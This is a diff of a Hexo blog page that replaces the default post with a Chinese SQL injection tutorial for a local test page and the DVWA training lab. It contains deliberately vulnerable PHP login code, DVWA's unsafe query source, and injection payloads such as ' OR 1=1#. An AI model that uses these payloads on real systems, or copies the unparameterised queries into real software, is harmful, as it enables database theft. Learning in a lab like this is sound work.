@@ -6,19 +6,49 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Hello World | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <meta name="description" content="@TOC SQL注入原理及DVWA实战简介：刚学到SQL注入嘛，所以写了一个简单的页面方便自己测试，又在DVWA上实战了一下，感觉还不错~~">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2020/11/13/hello-world/index.html">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2020/11/13/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%8F%8ADVWA%E5%AE%9E%E6%88%98/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="@TOC SQL注入原理及DVWA实战简介：刚学到SQL注入嘛，所以写了一个简单的页面方便自己测试，又在DVWA上实战了一下，感觉还不错~~">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-11-13T06:30:18.711Z">
-<meta property="article:modified_time" content="2020-11-13T06:30:18.711Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020103017453782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201030175509965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201030180202893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201030180907280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201030180930463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201030224607160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201030225239785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201030225531513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201030230039676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201030230616510.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031001224830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031001250266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020103100133944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020103100245724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031002531738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031002622587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031002911853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031003337859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020103100352723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031003703352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031003944907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031004828575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031005456291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031005803740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031010223345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031010525269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031011000122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031011213467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201031011228856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="article:published_time" content="2020-11-13T08:24:28.529Z">
+<meta property="article:modified_time" content="2020-11-13T08:40:59.472Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2020103017453782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -154,39 +184,99 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-SQL注入原理及DVWA实战" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      Hello World
-    </h1>
-  
-
-        
-        <a href="/2020/11/13/hello-world/" class="archive-article-date">
-  	<time datetime="2020-11-13T06:30:18.711Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-13</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+        <p>@<a href="SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%8F%8ADVWA%E5%AE%9E%E6%88%98">TOC</a></p>
+<h1 id="SQL注入原理及DVWA实战"><a href="#SQL注入原理及DVWA实战" class="headerlink" title="SQL注入原理及DVWA实战"></a>SQL注入原理及DVWA实战</h1><p>简介：刚学到SQL注入嘛，所以写了一个简单的页面方便自己测试，又在DVWA上实战了一下，感觉还不错~~</p>
+<a id="more"></a>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<h1 id="一、SQL注入原理"><a href="#一、SQL注入原理" class="headerlink" title="一、SQL注入原理"></a>一、SQL注入原理</h1><p>要理解SQL注入的原理，就必须了解能够对数据库中的信息进行增删改查的SQL语言。Sql 注入攻击就是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。当然，根据数据库版本类型的不同，相应的注入语句也有所不同，这需要我们去了解学习。</p>
+<h1 id="二、测试实例"><a href="#二、测试实例" class="headerlink" title="二、测试实例"></a>二、测试实例</h1><p>需要用到的知识：PHP语言，Apache Web服务器，MySQL数据库</p>
+<p><strong>1.首先打开phpstudy，开启apache web服务和数据库</strong><br><img src="https://img-blog.csdnimg.cn/2020103017453782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>2.利用Navicat创建数据库（也可以用别的软件创建，在phpstudy里也可以创建，懂mysql命令行的也可以用cmd创建，看自己喜好）</strong></p>
+<p>创建数据库名为test，在数据库中创建表users，在表中插入两个字段name和password，添加若干数据。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201030175509965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><strong>3.书写sql.php和sql.html代码</strong></p>
+<p>将这两个文件保存到phpstudy目录的WWW跟目录下（我保存到了WWW目录下的CrackTest中了）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;sql.php代码</span><br><span class="line">&lt;?php</span><br><span class="line">$name&#x3D;$_POST[&quot;userID&quot;];</span><br><span class="line">$passwd&#x3D;$_POST[&quot;userPasswd&quot;];</span><br><span class="line">$db&#x3D;@mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;) or die(&quot;Fail&quot;);</span><br><span class="line">mysqli_select_db($db,&quot;test&quot;);</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE name &#x3D; &#39;$name&#39; AND password &#x3D; &#39;$passwd&#39;&quot;;</span><br><span class="line">echo &quot;&lt;TABLE border&#x3D;1&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&lt;th&gt;Name&lt;&#x2F;th&gt;&lt;th&gt;Password&lt;&#x2F;th&gt;&lt;tr&gt;&quot;;</span><br><span class="line">if($result&#x3D;mysqli_query($db,$sql)) &#123;</span><br><span class="line">	while($array&#x3D;mysqli_fetch_row($result)) &#123;</span><br><span class="line">		printf(&quot;&lt;tr&gt;&lt;td&gt;%s&lt;&#x2F;td&gt;&lt;td&gt;%s&lt;&#x2F;td&gt;&lt;tr&gt;&quot;, $array[0], $array[1]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;&#x2F;TABLE&gt;&quot;;</span><br><span class="line">echo &quot;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--sql.html代码--&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 4.01 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;html4&#x2F;loose.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;SQLtest&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;sql.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">	用户名：</span><br><span class="line">	&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;userID&quot; &#x2F;&gt;</span><br><span class="line">	密码：</span><br><span class="line">	&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;userPasswd&quot; &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>4.开始sql注入测试</strong></p>
+<p>在浏览器中打开我们的sql.html<br><img src="https://img-blog.csdnimg.cn/20201030180202893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>完整的sql语句是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name &#x3D; &#39;&#39; OR 1&#x3D;1# AND password &#x3D; &#39;&#39;;</span><br></pre></td></tr></table></figure>
+<p>所以我们构造sql注入payload，sql语句执行的结果是永真的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; OR 1&#x3D;1#</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201030180907280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>提交后<br><img src="https://img-blog.csdnimg.cn/20201030180930463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>数据库中的用户名和密码就被我们全部查出来了</p>
+<h1 id="三、DVWA实战"><a href="#三、DVWA实战" class="headerlink" title="三、DVWA实战"></a>三、DVWA实战</h1><p>DVWA是一个基于php的网络安全练习的环境，也就是可以用来练习hacker技术的地方，无须自己找个网络下手或者搭建安全环境来练习网络攻防。<br>安装可以参考：<a target="_blank" rel="noopener" href="https://my.oschina.net/u/3776619/blog/1803401">DVWA下载安装教程</a></p>
+<h2 id="SQL-Injection模块测试"><a href="#SQL-Injection模块测试" class="headerlink" title="SQL Injection模块测试"></a>SQL Injection模块测试</h2><h3 id="1-测试需求分析"><a href="#1-测试需求分析" class="headerlink" title="1.测试需求分析"></a>1.测试需求分析</h3><p><strong>测试对象：</strong> DVWA漏洞系统–SQL Injection模块–User ID提交功能<br><strong>测试等级：</strong> Low<br><strong>测试目标：</strong> 判断被测模块是否存在SQL注入漏洞，漏洞是否可利用，若可以则检测出对应的数据库数据<br><strong>测试方式：</strong> 手工方式</p>
+<p>Low等级测试源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $id &#x3D; $_REQUEST[ &#39;id&#39; ];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database</span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;;</span><br><span class="line">    $result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results</span><br><span class="line">    while( $row &#x3D; mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Get values</span><br><span class="line">        $first &#x3D; $row[&quot;first_name&quot;];</span><br><span class="line">        $last  &#x3D; $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user</span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>上述代码中后台通过参数id构造sql语句进行后台数据库查询，并没有任何的敏感字符过滤和其他操作，我们可以很容易就能探测出sql注入漏洞，得到更多权限，干更多事情。<br>但是在实际测试中，我们并没有系统后台的php源码，只能进行类似于黑盒测试，构造特殊语句传入后台，根据报出的信息进行分析。</p>
+<h3 id="2-判断是否存在注入点，以及注入的类型"><a href="#2-判断是否存在注入点，以及注入的类型" class="headerlink" title="2.判断是否存在注入点，以及注入的类型"></a>2.判断是否存在注入点，以及注入的类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：单引号 &#39; 或 反斜杠 \</span><br></pre></td></tr></table></figure>
+<p>构造后的payload就是<br><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39;&#39;;</code><br><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;\&#39;;</code><br>(这里其实我们并不知道它查询的内容，表，查询参数是什么，会在后面说明为什么是这几个参数，这里写出来是为了好理解)</p>
+<p><img src="https://img-blog.csdnimg.cn/20201030224607160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出：报错信息，知道了数据库是 MySQL</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<ul>
+<li>对于MySQL，它的内容注释是<code>#</code>和<code>--</code></li>
+<li>Mysql安装后默认会创建三个数据库：information_schema、mysql和test。其中名为“mysql”的数据库很重要，它里面保存有MYSQL的系统信息、用户修改密码和新增用户，实际上就是针对该数据库中的有关数据表进行操作。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：双引号 &quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201030225239785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出：语法无异常，但是没有内容返回</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：数字1</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201030225531513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>有内容输出，分别是ID，First name，Surname字段名及其值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：1&#39; or 1&#x3D;1 #</span><br><span class="line">	1&#39; or 1&#x3D;1 -- （末尾含有空格，--注释语法的规定）</span><br></pre></td></tr></table></figure>
+<p>构造的payload：<br><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39; or 1=1 #&#39;;</code><br><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39; or 1=1 -- ;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20201030230039676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>根据我们构造的永真语句，可以看到后台把所有的First name，Surname输出了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分别输入数字1，2，3，4，5，6...</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201030230616510.png#pic_center" alt="在这里插入图片描述"></p>
+<p>我们可以得到数据库中用户表的行数（rows）为 5</p>
+<p>现在我们判定这个页面存在字符型的sql注入漏洞</p>
+<h3 id="3-获取数据库信息"><a href="#3-获取数据库信息" class="headerlink" title="3.获取数据库信息"></a>3.获取数据库信息</h3><h4 id="猜解所查询的字段数目"><a href="#猜解所查询的字段数目" class="headerlink" title="猜解所查询的字段数目"></a>猜解所查询的字段数目</h4><p><strong>方式1：</strong><code>order by num#</code>进行猜解<br>如果num的值大于查询语句中的字段数，就会报错</p>
